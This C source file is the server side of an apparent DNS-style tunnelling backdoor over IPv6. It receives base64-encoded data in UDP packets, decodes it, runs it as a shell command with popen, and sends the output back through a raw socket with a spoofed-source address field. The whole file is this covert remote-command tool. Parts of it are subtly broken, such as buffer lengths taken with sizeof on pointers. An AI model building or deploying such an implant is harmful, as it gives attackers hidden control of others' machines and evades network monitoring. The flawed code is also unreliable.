#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>  

#include "structs.h"
#include "base64.h"
#include "net_utils.h"
#include "utils.h"

#define MAX_DNS_QRRY 250
#define MAX_DNS_PKT_SIZE 512
#define BUFF_SIZE 8192


int main(int argc,char **argv)
{

//if(argc<2){printf("usage: %s my_addr\n",argv[0]);exit(1);}

struct net_address s_addreses;
fd_set read_handler;					//for pipe
FILE *pipe;
unsigned char *p_buffer;
unsigned char c_ip6_addr[sizeof(s_addreses.c_addr.sin6_addr)];
unsigned int querry_len;
int pay_len, r_sock, s_sock;

p_buffer = malloc(MAX_DNS_PKT_SIZE);			//buffer for our packet
memset(p_buffer,0,MAX_DNS_PKT_SIZE);

unsigned char *nxt_data;
nxt_data = p_buffer + sizeof(struct ip6_hdr) + sizeof(struct udphdr) + sizeof(struct dns_hdr);



//create sockd for sending
s_sock = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
if(s_sock < 0)
{
	perror("socket()");
	exit(EXIT_FAILURE);
}

int optval = 1;
if (setsockopt(s_sock, IPPROTO_IPV6, IPV6_HDRINCL, (char *)&optval, sizeof(optval)) != 0)
{
	perror("setsockopt()");
	exit(EXIT_FAILURE);
}

//setup addres to connet to
memset(&s_addreses.c_addr,0,sizeof(s_addreses.c_addr));
s_addreses.c_addr.sin6_family = AF_INET6;
//if(inet_pton(AF_INET6,argv[1],&s_addreses.c_addr.sin6_addr) == 0)
//{
//	printf("Invalid addres\n");
//	exit(EXIT_FAILURE);
//}

//setup my addres
memset(&s_addreses.spoofed_addr,0,sizeof(s_addreses.spoofed_addr));
s_addreses.spoofed_addr.sin6_family = AF_INET6;
//if(inet_pton(AF_INET6,argv[1],&s_addreses.spoofed_addr.sin6_addr) == 0)	//here goes spoofed addres
//{
//	printf("Invalid addres\n");
//	exit(EXIT_FAILURE);
//} 
	

//prepare my real addr
memset(&s_addreses.my_addr,0,sizeof(s_addreses.my_addr));
s_addreses.my_addr.sin6_family = s_addreses.my_addr.sin6_family = AF_INET6;
s_addreses.my_addr.sin6_addr  = in6addr_any;
s_addreses.my_addr.sin6_port = htons(5000);

//create sockd for reciving
r_sock = socket(AF_INET6,SOCK_DGRAM,0);
if(r_sock < 0)
{
	perror("socket()");
	exit(EXIT_FAILURE);
}


if(bind(r_sock, (struct sockaddr *) &s_addreses.my_addr, sizeof(s_addreses.my_addr) ) <0)
{
	perror("bind()");
	exit(EXIT_FAILURE);
}

unsigned short port = 5001;
unsigned char buffer[BUFF_SIZE];
unsigned char buffer2[256];
unsigned int packet_count, data_len, ret_val, bytes;
unsigned char is_addr_setup =0,exit_loop =0;
char is_client=0;

void *recive_buffer,*decoding_buffer;


while(1)
{
	do
	{
		packet_count = recv_packet_len(read_handler, r_sock, buffer, &(s_addreses), is_client, &is_addr_setup);
		printf("packet_count=%d\n",packet_count);
	}while(packet_count == 0 || is_addr_setup==0 );
	
	if( ( recive_buffer = malloc(MAX_DNS_QRRY*(packet_count)) ) ==0)
	{
		perror("malloc()");
		exit(EXIT_FAILURE);
	}
	if( ( decoding_buffer = malloc( (((MAX_DNS_QRRY*(packet_count))*3)/4)+4)  ) ==0)
	{
		perror("malloc()");
		exit(EXIT_FAILURE);
	}
	
	data_len = sizeof(recive_buffer);
	bytes = sizeof(decoding_buffer);
	do{
		ret_val = recv_and_join(read_handler, r_sock, buffer, &(s_addreses), is_client, recive_buffer, &data_len, packet_count);
		if(ret_val==0)
		{
			exit_loop =1;
			break;
		}
	}while(ret_val==1);
	
	if (exit_loop == 1)
	{
		exit_loop=0;
		continue;
	}
	
	base64_decode(recive_buffer, data_len, decoding_buffer, &bytes);
	memset(decoding_buffer+bytes,0,1);	//null byte at end
	
	//execve
	
	pipe = popen(decoding_buffer, "r");
	bytes = read(fileno(pipe),buffer, BUFF_SIZE);
	if(bytes == 0)
	{
		printf("error reading form stdout\n");
		free(recive_buffer);
		free(decoding_buffer);
		continue;
	}
	free(recive_buffer);
	free(decoding_buffer);
	fragment_and_send(buffer, bytes, s_addreses, p_buffer, s_sock, port);
	
	//printf("response sent\n");
}
return 0;
}	


